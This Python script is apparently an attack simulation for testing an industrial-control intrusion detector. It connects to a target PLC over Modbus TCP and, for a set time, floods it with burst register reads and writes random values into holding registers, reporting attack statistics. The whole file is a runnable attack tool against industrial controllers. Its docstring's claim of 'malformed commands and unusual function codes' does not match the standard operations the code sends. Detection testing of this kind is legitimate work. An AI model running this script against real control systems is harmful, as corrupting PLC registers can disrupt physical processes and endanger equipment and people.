#!/usr/bin/env python3
"""
Attack: Command Injection
Sends malformed Modbus commands and unusual function codes
Expected Detection: Protocol anomalies and unusual command patterns
"""

import sys
import time
import random
from pymodbus.client import ModbusTcpClient

def run_attack(target_ip: str, duration: int = 30):
    """
    Perform command injection with unusual Modbus operations
    
    Args:
        target_ip: Target PLC IP address
        duration: Attack duration in seconds
    """
    print(f"[*] Starting command injection attack on {target_ip}")
    print(f"[*] Duration: {duration} seconds")
    print(f"[*] This will send unusual Modbus operations")
    
    client = ModbusTcpClient(target_ip, port=502, timeout=1)
    
    if not client.connect():
        print(f"[!] Failed to connect to {target_ip}")
        return {"status": "failed", "reason": "connection_failed"}
    
    print(f"[+] Connected to {target_ip}")
    
    start_time = time.time()
    command_count = 0
    errors = 0
    
    try:
        while (time.time() - start_time) < duration:
            operation = random.choice(['read_burst', 'write_burst', 'mixed'])
            
            try:
                if operation == 'read_burst':
                    # Burst read - read many registers at once (unusual)
                    result = client.read_holding_registers(0, count=125, slave=1)
                    if not result.isError():
                        command_count += 1
                        print(f"[+] Burst read: 125 registers")
                    else:
                        errors += 1
                
                elif operation == 'write_burst':
                    # Burst write - write multiple registers
                    values = [random.randint(0, 65535) for _ in range(10)]
                    result = client.write_registers(0, values, slave=1)
                    if not result.isError():
                        command_count += 1
                        print(f"[+] Burst write: 10 registers")
                    else:
                        errors += 1
                
                elif operation == 'mixed':
                    # Rapid read-write pattern (unusual)
                    for i in range(5):
                        client.read_holding_registers(i * 10, count=5, slave=1)
                        client.write_register(i * 10, random.randint(0, 1000), slave=1)
                    command_count += 10
                    print(f"[+] Mixed operations: 5 read + 5 write")
                
                time.sleep(0.2)
                
            except Exception as e:
                errors += 1
                print(f"[!] Error: {e}")
                continue
    
    finally:
        client.close()
        elapsed = time.time() - start_time
        
        print(f"\n[*] Attack complete!")
        print(f"[*] Commands sent: {command_count}")
        print(f"[*] Errors: {errors}")
        print(f"[*] Command rate: {command_count / elapsed:.1f} commands/sec")
        print(f"[*] Elapsed time: {elapsed:.1f} seconds")
        
        return {
            "status": "completed",
            "commands_sent": command_count,
            "errors": errors,
            "command_rate": round(command_count / elapsed, 2),
            "duration": round(elapsed, 2)
        }

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python command_injection.py <target_ip> [duration_seconds]")
        sys.exit(1)
    
    target = sys.argv[1]
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 30
    
    run_attack(target, duration)
